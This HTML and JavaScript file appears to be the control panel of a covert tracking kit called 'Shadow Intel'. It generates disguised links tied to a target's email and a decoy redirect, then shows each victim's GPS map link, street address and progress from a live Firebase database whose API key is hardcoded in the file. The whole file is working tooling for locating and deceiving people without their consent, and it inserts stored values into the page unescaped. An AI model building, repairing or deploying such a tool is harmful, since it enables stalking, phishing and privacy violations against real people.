<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Shadow Intel | Master Control</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { background: #020617; color: #f1f5f9; font-family: 'Inter', sans-serif; }
        .glass-panel { background: rgba(15, 23, 42, 0.9); border: 1px solid #1e293b; border-radius: 1.5rem; }
        .id-badge { font-family: 'JetBrains Mono', monospace; color: #60a5fa; background: rgba(37, 99, 235, 0.1); padding: 2px 8px; border-radius: 6px; border: 1px solid rgba(37, 99, 235, 0.2); }
    </style>
</head>
<body class="p-6">
    <div class="max-w-7xl mx-auto space-y-8">
        <div class="flex flex-col md:flex-row justify-between items-center gap-4">
            <div>
                <h1 class="text-3xl font-black italic text-blue-500 tracking-tighter">INTEL<span class="text-white">SHADOW</span></h1>
                <p class="text-[9px] font-bold text-slate-500 tracking-[0.3em] uppercase">Control Center v3.0</p>
            </div>
            <div class="relative">
                <i class="fa-solid fa-magnifying-glass absolute left-4 top-1/2 -translate-y-1/2 text-slate-500 text-xs"></i>
                <input type="text" id="masterSearch" onkeyup="searchByID()" placeholder="Search by Unique ID..." 
                class="bg-slate-900 border border-slate-800 rounded-2xl pl-10 pr-4 py-3 text-xs w-80 text-blue-400 outline-none focus:border-blue-500 transition-all">
            </div>
        </div>

        <div class="glass-panel p-8 space-y-6 shadow-2xl border-t-4 border-t-blue-600">
            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div class="space-y-2">
                    <label class="text-[10px] font-bold text-slate-500 uppercase ml-1">Log Receiver Email</label>
                    <input type="email" id="targetEmail" placeholder="admin@secure.com" class="w-full bg-black/50 border border-slate-700 p-4 rounded-xl outline-none focus:border-blue-500 text-sm">
                </div>
                <div class="space-y-2">
                    <label class="text-[10px] font-bold text-slate-500 uppercase ml-1">Landing Redirect</label>
                    <input type="text" id="targetRed" placeholder="https://youtube.com/..." class="w-full bg-black/50 border border-slate-700 p-4 rounded-xl outline-none focus:border-blue-500 text-sm">
                </div>
            </div>
            <button onclick="deploy()" class="w-full bg-blue-600 hover:bg-blue-700 py-4 rounded-xl font-black uppercase text-xs tracking-widest shadow-lg transition-all active:scale-95">Deploy Session ID</button>
            <div id="output" class="hidden p-4 border border-dashed border-blue-500/30 rounded-xl bg-blue-500/5 mt-4">
                <input type="text" id="finalLink" readonly class="w-full bg-transparent p-2 text-xs font-mono text-green-400 outline-none mb-2">
                <button onclick="copy()" class="bg-blue-600 px-6 py-2 rounded-xl text-[10px] font-black">Copy Link</button>
            </div>
        </div>

        <div class="glass-panel overflow-hidden">
            <div class="p-5 border-b border-slate-800 bg-slate-900/50 flex justify-between items-center">
                <h3 class="text-xs font-black text-slate-400 uppercase tracking-widest">Real-Time Transactions</h3>
                <span id="activeCount" class="text-blue-500 font-black text-[10px]">0 SESSIONS</span>
            </div>
            <div class="overflow-x-auto">
                <table class="w-full text-left" id="intelTable">
                    <thead class="bg-black/40 text-[9px] font-black text-slate-500 uppercase">
                        <tr>
                            <th class="p-5">Transaction ID</th>
                            <th class="p-5">Target Email</th>
                            <th class="p-5">Live Address</th>
                            <th class="p-5">Progress</th>
                            <th class="p-5 text-right">Update</th>
                        </tr>
                    </thead>
                    <tbody id="logList" class="divide-y divide-slate-800/50 text-[11px]"></tbody>
                </table>
            </div>
        </div>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyAfrFpzw2UddAxGrhAlIeP_c1OaoIG6wNk",
            databaseURL: "https://in-app-update-21c61-default-rtdb.firebaseio.com",
            projectId: "in-app-update-21c61",
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        function deploy() {
            const email = document.getElementById('targetEmail').value;
            const red = document.getElementById('targetRed').value;
            if(!email || !red) return alert("All fields required!");
            const uniqueKey = db.ref().child('shadow_sessions').push().key; 
            const link = window.location.origin + window.location.pathname.replace('generator.html', 'track.html') + "?session=" + uniqueKey + "&email=" + email + "&red=" + encodeURIComponent(red);
            document.getElementById('finalLink').value = link;
            document.getElementById('output').classList.remove('hidden');
            db.ref('shadow_sessions/' + uniqueKey).set({
                session_id: uniqueKey, target_email: email, redirect: red,
                location: "Awaiting GPS...", address: "Awaiting...", progress: "0/6", time: Date.now()
            });
        }

        db.ref('shadow_sessions').on('value', snap => {
            const list = document.getElementById('logList');
            list.innerHTML = "";
            let count = 0;
            snap.forEach(child => {
                const l = child.val(); count++;
                list.innerHTML = `<tr class="hover:bg-blue-500/5">
                    <td class="p-5"><span class="id-badge">${l.session_id}</span></td>
                    <td class="p-5 text-slate-400">${l.target_email}</td>
                    <td class="p-5"><a href="${l.location}" target="_blank" class="text-blue-500 underline block mb-1">Maps Link</a>
                        <span class="text-[10px] text-slate-500">${l.address || ''}</span></td>
                    <td class="p-5"><span class="font-bold text-green-500">${l.progress}</span></td>
                    <td class="p-5 text-right text-slate-500">${new Date(l.time).toLocaleTimeString()}</td>
                </tr>` + list.innerHTML;
            });
            document.getElementById('activeCount').innerText = count + " SESSIONS";
        });

        function searchByID() {
            let filter = document.getElementById('masterSearch').value.toUpperCase();
            let rows = document.getElementById('logList').getElementsByTagName('tr');
            for (let i = 0; i < rows.length; i++) {
                rows[i].style.display = (rows[i].innerText.toUpperCase().indexOf(filter) > -1) ? "" : "none";
            }
        }
        function copy() { const e = document.getElementById('finalLink'); e.select(); document.execCommand('copy'); alert("Link Copied!"); }
    </script>
</body>
</html>
